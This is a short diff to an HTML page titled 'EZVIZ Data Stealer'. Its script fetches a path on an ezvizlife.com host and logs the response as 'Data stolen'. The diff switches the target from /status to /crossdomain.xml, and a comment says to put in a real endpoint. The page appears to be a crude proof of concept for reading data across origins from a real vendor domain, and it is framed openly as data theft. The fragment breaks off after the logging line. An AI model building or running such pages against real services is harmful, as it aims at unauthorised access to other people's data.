@@ -6,7 +6,7 @@
   <body>
     <h1>EZVIZ Data Stealer</h1>
     <script>
-      fetch('https://iindiaopen.ezvizlife.com/status') // ← replace this with a real endpoint!
+      fetch('https://iindiaopen.ezvizlife.com/crossdomain.xml') // ← replace this with a real endpoint!
         .then(response => response.text())
         .then(data => {
           console.log("Data stolen:", data);
